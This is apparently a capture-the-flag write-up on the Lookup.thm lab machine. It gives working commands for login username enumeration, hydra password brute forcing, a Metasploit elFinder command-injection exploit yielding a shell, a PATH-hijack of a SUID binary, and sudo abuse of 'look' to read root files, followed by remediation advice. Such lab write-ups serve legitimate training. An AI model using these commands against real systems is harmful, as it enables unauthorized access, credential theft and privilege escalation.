# CTF Security Assessment Report: Lookup.thm

**Author:** tsiory
**Date:** May 10, 2026
**Target:** 10.130.166.186 (lookup.thm)

---

## 1. Executive Summary
This report documents the full exploitation chain for the **Lookup.thm** machine. The attack began with web-based username enumeration and brute-forcing to identify a valid user. Subsequent subdomain discovery revealed a hidden **elFinder** service, which was exploited via Metasploit to gain initial access as `www-data`. Privilege escalation was then achieved through a custom SUID binary and misconfigured sudo permissions.

## 2. Reconnaissance & Enumeration

### 2.1 Service Scanning
Initial Nmap scan to identify open ports:
```bash
nmap -sC -sV -oN nmap_scan.txt lookup.thm
```

### 2.2 Web Enumeration & User Identification
The primary web application at `/login.php` was tested for username enumeration. A discrepancy in the response `Content-Length` (74 bytes for invalid, 62 bytes for valid) confirmed the existence of a user.

**Username Enumeration Command:**
```bash
ffuf -w usernames.txt -X POST -d "username=FUZZ&password=123" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -u http://lookup.thm/login.php -fs 74 -or
```
*   **Result:** Identified valid user: **jose**.

### 2.3 Password Brute Force
Following the identification of the user, a brute-force attack was conducted to recover credentials.
```bash
hydra -l jose -P /usr/share/wordlists/rockyou.txt lookup.thm http-post-form "/login.php:username=^USER^&password=^PASS^:Wrong username or password"
```
*    **Result:** Identified valid password: **password123**.

---

## 3. Service Exploitation

### 3.1 Exploiting elFinder (CVE-2019-9194)
The subdomain `file.lookup.thm` hosted an **elFinder** file manager service. This service was found to be vulnerable to a command injection exploit in the `exiftran` component.

**Metasploit Execution:**
```bash
msfconsole
use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection
set RHOSTS file.lookup.thm
set TARGETURI /php/connector.php
exploit
```
*   **Result:** Established a meterpreter shell as **www-data**.

---

## 4. Privilege Escalation

### 4.1 Pivot to 'think' (SUID Hijacking)
A search for SUID binaries identified `/usr/sbin/pwm`.
```bash
find / -perm -u=s -type f 2>/dev/null
```
Analysis of the `pwm` binary revealed it executes the `id` command with a relative path to locate a password file at `/home/[user]/.passwords`.

**Exploitation Steps:**
```bash
# Create a malicious id script
echo '#!/bin/bash' > /tmp/id
echo 'echo "uid=1001(think) gid=1001(think) groups=1001(think)"' >> /tmp/id
chmod +x /tmp/id

# Hijack the PATH and run pwm
export PATH=/tmp:$PATH
/usr/sbin/pwm
```
*   **Result:** Successfully recovered credentials for the user **think**.

### 4.2 Pivot to 'root' (Sudo Abuse)
Checking sudo privileges for user `think` revealed access to `/usr/bin/look`.
```bash
sudo -l
```
The `look` utility can read files by specifying a null string as a search prefix.

**Reading Flags:**
```bash
# Capture User Flag
sudo look "" /home/think/user.txt

# Capture Root Flag
sudo look "" /root/root.txt
```

---

## 5. Conclusion & Remediation
The target was fully compromised through a sequence of information leakage, weak authentication, and insecure binary configurations. 

**Recommendations:**
1.  **Secure Web Inputs:** Use generic error messages for login failures.
2.  **Patch Management:** Update elFinder to a non-vulnerable version.
3.  **Secure Coding:** Use absolute paths in SUID binaries and avoid calling external shell commands.
4.  **Least Privilege:** Restrict sudo access for binaries that allow arbitrary file reads.
